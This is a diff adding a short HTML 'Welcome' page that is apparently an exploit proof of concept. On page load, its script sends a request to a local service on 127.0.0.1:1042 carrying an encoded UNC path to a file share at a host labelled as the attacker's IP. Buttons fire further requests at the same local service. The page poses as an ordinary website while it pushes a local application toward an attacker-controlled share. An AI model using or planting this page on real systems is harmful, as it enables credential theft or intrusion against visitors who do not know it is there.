@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Welcome</title>
+</head>
+
+<body>
+    <h1>Welcome to our website!</h1>
+    <p>Loading content, please wait...</p>
+    <button type="button" onclick="sendRequest()">Send</button>
+    <button type="button" onclick="putImage()">Put image</button>
+    <script>
+        // attacker IP = 192.168.48.134
+        new Image().src = 'http://127.0.0.1:1042/type/1/model/x/image/' + btoa('\\\\192.168.48.134\\s\\i.jpg');
+
+        function sendRequest() {
+            fetch('http://127.0.0.1:1042/lib/1/language');
+        }
+
+        function putImage() {
+            const img = document.createElement('img');
+            img.src = 'http://127.0.0.1:1042/lib/1/language';
+            document.body.appendChild(img);
+        }
+    </script>
+</body>
+
+</html>
